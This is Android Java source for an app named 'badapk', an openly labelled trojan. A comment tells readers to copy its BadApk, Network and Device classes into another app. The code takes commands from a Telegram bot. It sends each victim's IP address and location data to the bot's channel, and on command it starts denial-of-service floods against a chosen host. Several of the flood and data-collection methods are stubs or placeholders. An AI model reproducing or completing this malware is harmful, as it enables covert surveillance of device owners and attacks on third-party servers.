package com.example.badapk;

import android.Manifest;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Objects;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try { this.getSupportActionBar().hide(); }
        catch (NullPointerException e){}

        /**
         * ReadMe now :P
         * 1) if code dosnt work -> add follow permission at your AndroidManifest.xml of mobile app
         *    <uses-permission android:name="android.permission.INTERNET" />
         *    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
         *    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
         *
         * 2) for trojan you are need copy from here only class: BadApk, Network, Device.
         * */

        Thread main = new Thread() {
            @Override
            public void run() {
                try {
                    TextView logTextView = findViewById(R.id.logTextView);

                    // permissions
//                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
//                    LocationManager locationManager;
//                    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
//                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) { return; }
//                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 5, (LocationListener) this);
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.INTERNET}, 1);

                    // demonstration
                    // info about device
                    Device device = new Device();
                    String[] bot = new String[]{"", "", ""}; // info of victim of apk
                    bot[0] = device.ip("external");
                    bot[1] = device.mac();
                    bot[2] = device.geo();
                    logTextView.setText("your ip: " + bot[0] + "\n" + "your mac: " + bot[1] + "\n" + "your geoLocation: " + bot[2]);

                    // main exec
                    BadApk badApk = new BadApk();
                    badApk.start();
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
                finally {

                }
            }
        };
        main.start();
    }
}

class BadApk {
    private static String[] mobile = new String[]{"", "", ""}; // info of victim of apk

    public static String getGetUpdatesUrl(){
        return getUpdatesUrl;
    }
    public static String getSendMessageUrl(){
        return sendMessageUrl;
    }

    static private String botToken = "bot1111111111:aaaaaaaaaaaaaaaaaaaaa-__fffffffffff", nameBot = "botName";
    static private String getUpdatesUrl = "https://api.telegram.org/" + botToken + "/getUpdates";
    static private String sendMessageUrl = "https://api.telegram.org/" + botToken + "/sendMessage?chat_id=@" + nameBot + "&text=";

    static Network network = new Network();
    static Device device = new Device();

    // get cmd from telegram
    // 1) cmd give post info of device to telegram
    // 2) or cmd start ddos of url
    public static void start() throws IOException {
        try {
            // get cmd
            // parse: /result/[]/message/text
            String[] data, array = new String[]{""};

            // send request
            data = network.httpsUrlCon(getGetUpdatesUrl());
            // get result
            data = network.parse(data, "result");
            // get get array
            data = network.parse(data, "message");
            // get message
            // array will have clear json instead array
            array[0] = data[data.length -1];
            data = network.parse(array, "text");
            // get control using parse

            String cmd = (data[0].split("/")[1]).split("@")[0];
            if (Objects.equals(cmd, "info")) {
                // get info device
                mobile[0] = device.mac();
                mobile[1] = device.ip("external");
                mobile[2] = device.geo();
//                mobile[3] = device.getName(); // for identify at telegram

                // send info to telegram
                network.httpsUrlCon(getSendMessageUrl() + mobile[0] + "_" + mobile[1] + "_" + mobile[2]);
            } else if (cmd.contains("_")){
                String host = cmd.split("_")[0] + "." + cmd.split("_")[1];
                network.httpFlood(host);
                network.httpsFlood(host);
                network.udpFlood(host);
                network.icmpFlood(host);
                network.synFlood(host, "443");
            }
        } catch (Exception e){
            Log.d("badApk", String.valueOf(e));
        }
    }
}


class Network {
    // accept "GET", "api.ipify.org", "/", "format=json"
    // accept "GET", "api.ipify.org", "/file/", "format=json"
    // accept "POST", "api.ipify.org", "/", "format=json"
    // return array String[]
    public String[] httpSocket(String method, String host, String file, String args) {
        String[] data = new String[]{"", "", ""};
        try {
            // make tcp connection
            Socket socket = new Socket(InetAddress.getByName(host), 80);
            PrintWriter wtr = new PrintWriter(socket.getOutputStream());

            // make http packet
            if (method == "POST") {
                wtr.println(method + " " + file + " HTTP/1.1");
                wtr.println("Host: " + host);
                wtr.println(args);
            } else {
                wtr.println(method + " " + file + "?" + args + " HTTP/1.1");
                wtr.println("Host: " + host);
            }
            wtr.println("");
            wtr.flush();

            // read response
            BufferedReader bufRead = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String outStr;
            while ((outStr = bufRead.readLine()) != null) {
                data[0] = data[0] + outStr;
            }
            bufRead.close();
            wtr.close();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return data;
    }

    // as at httpSocket
    public String[] httpsSocket(String method, String host, String file, String args) {
        // as most cool your are need run this at new thread and with try{}
        String[] data = new String[]{"", "", ""};
        try {
            // make tcp ssl
            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            SSLSocket socket = (SSLSocket) factory.createSocket(host, 443);
            socket.startHandshake();

            // make http
            PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())));
            if (method == "POST") {
                out.println(method + " " + file + " HTTP/1.0");
                out.println("Host: " + host);
                out.println(args);
            } else {
                out.println(method + " " + file + "?" + args + " HTTP/1.0");
                out.println("Host: " + host);
            }
            out.println();
            out.flush();

            if (out.checkError())
                System.out.println("SSLSocketClient:  java.io.PrintWriter error");

            // read response
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                data[0] = data[0] + inputLine;
            }

            in.close();
            out.close();
            socket.close();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return data;
    }

    public String[] httpsUrlCon (String url) {
        String[] data = new String[]{""};

        try {
            SSLSocketFactory sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            HttpsURLConnection con = (HttpsURLConnection) new URL(url).openConnection();
            con.setSSLSocketFactory(sslSocketFactory);
            con.setRequestMethod("GET");

            BufferedReader br = new BufferedReader(new InputStreamReader((InputStream) con.getContent()));
            String input;
            while ((input = br.readLine()) != null){
                data[0] = data[0] + input;
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return data;
    }

    // accept http document or json
    // return hashmap of json
    public String[] parse(String[] data, String key) {
        try {
            if (Objects.equals(data[0].split("\\{", 2)[0], "")){

                // if clear json
                String[] parsed = new String[]{""};
                parsed[0] = String.valueOf(new JSONObject(data[0]).get(key));
                return parsed;

            } else if (Objects.equals(data[0].split("\\[", 2)[0], "")) {

                // String[] to jsonArray to jsonObj to String[] (by key)
                JSONArray jsonArray = new JSONArray(data[0]);
                String[] parsed = new String[jsonArray.length()];
                for (int i = 0; i < jsonArray.length(); i++) {
                    parsed[i] = String.valueOf(new JSONObject(String.valueOf(jsonArray.getJSONObject(i))).get(key));
                }

                return parsed;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return new String[]{""};
    }

    // start dos at new thread
    public void httpFlood(String url) {
//        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
//
//        try:
//            # Open the connection on that raw socket
//            dos.connect((ip, port))
//
//            # Send the request according to HTTP spec
//            #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
//            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
//            dos.send(byt)
//            except socket.error:
//            print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
//        finally:
//            # Close our socket gracefully
//            dos.shutdown(socket.SHUT_RDWR)
//            dos.close()
    }

    public void httpsFlood(String url) {
    }

    public void udpFlood(String url) {
    }

    public void icmpFlood(String url) {
    }

    public void synFlood(String url, String port) {
        for (int packets = 1; packets < 1000; packets++) {
            Thread thread = new Thread() {
                public void run() {
                    Socket socket = new Socket();
                    try {
                        socket.connect(new InetSocketAddress("https://" + url, Integer.parseInt(port)), 2500);
                        sleep(100);
                        socket.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            };
            thread.start();
        }
    }
}


class Device {
    public String ip(String external_Or_internal) {
        try {
            if (external_Or_internal == "internal") {
                // internal ip
//                WifiManager wifiManager = (WifiManager) context.getSystemService(WIFI_SERVICE);
//                int ipAddress = wifiManager.getConnectionInfo().getIpAddress();
//
//                if (ByteOrder.nativeOrder().equals(ByteOrder.LITTLE_ENDIAN)) {
//                    ipAddress = Integer.reverseBytes(ipAddress);
//                }
//                byte[] ipByteArray = BigInteger.valueOf(ipAddress).toByteArray();
//                try {
//                    ip = InetAddress.getByAddress(ipByteArray).getHostAddress();
//                } catch (UnknownHostException ex) {
//                    Log.e("WIFIIP", "Unable to get host address.");
//                    ip = null;
//                }
//                return ip;
            } else if (external_Or_internal == "external") {
                // external ip
                Network network = new Network();
                String[] data = network.httpsUrlCon("https://api.myip.com/?format=json");
                return String.valueOf(new JSONObject(data[0]).get("ip"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "0.0.0.0";
    }

    public String mac() {
        String mac = "mac";

//        try {
//            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
//            for (NetworkInterface nif : all) {
//                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
//
//                byte[] macBytes = nif.getHardwareAddress();
//                if (macBytes == null) {
//                    return "";
//                }
//
//                StringBuilder res1 = new StringBuilder();
//                for (byte b : macBytes) {
//                    res1.append(String.format("%02X:", b));
//                }
//
//                if (res1.length() > 0) {
//                    res1.deleteCharAt(res1.length() - 1);
//                }
//                return res1.toString();
//            }
//        } catch (Exception ex) {
//        }
        return mac;
    }

    public String geo() {
        String geo = "geo";

//        LocationManager locationManager = (LocationManager) Context.getSystemService(Context.LOCATION_SERVICE);
//        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, (LocationListener) this);
//        LocationListener locationListener = new MyLocationListener();
//
//        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
//            // here to request the missing permissions, and then overriding
//        }
//        locationManager.requestLocationUpdates(
//                LocationManager.GPS_PROVIDER,
//                5000,
//                10,
//                locationListener);
//
//		Location imHere = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

        return geo;
    }
}